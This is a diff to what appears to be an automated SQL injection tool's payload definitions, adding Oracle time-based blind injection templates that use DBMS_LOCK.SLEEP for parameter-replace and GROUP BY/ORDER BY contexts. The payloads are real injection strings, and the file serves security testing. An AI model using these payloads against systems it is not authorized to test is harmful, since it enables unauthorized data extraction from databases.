@@ -3325,7 +3325,26 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle time-based blind - Parameter replace</title>
+        <title>Oracle time-based blind - Parameter replace (DBMS_LOCK.SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>1,3</clause>
+        <where>3</where>
+        <vector>(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE [RANDNUM]; END IF; END)</vector>
+        <request>
+            <payload>(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE [RANDNUM]; END IF; END)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - Parameter replace (DBMS_PIPE.RECEIVE_MESSAGE)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
@@ -3605,7 +3624,26 @@ Formats:
     </test>
 
     <test>
-        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses</title>
+        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses (DBMS_LOCK.SLEEP)</title>
+        <stype>5</stype>
+        <level>3</level>
+        <risk>0</risk>
+        <clause>2,3</clause>
+        <where>1</where>
+        <vector>,(BEGIN IF ([INFERENCE]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE 1/(SELECT 0 FROM DUAL); END IF; END)</vector>
+        <request>
+            <payload>,(BEGIN IF ([RANDNUM]=[RANDNUM]) THEN DBMS_LOCK.SLEEP([SLEEPTIME]); ELSE 1/(SELECT 0 FROM DUAL); END IF; END)</payload>
+        </request>
+        <response>
+            <time>[SLEEPTIME]</time>
+        </response>
+        <details>
+            <dbms>Oracle</dbms>
+        </details>
+    </test>
+
+    <test>
+        <title>Oracle time-based blind - GROUP BY and ORDER BY clauses (DBMS_PIPE.RECEIVE_MESSAGE)</title>
         <stype>5</stype>
         <level>3</level>
         <risk>1</risk>
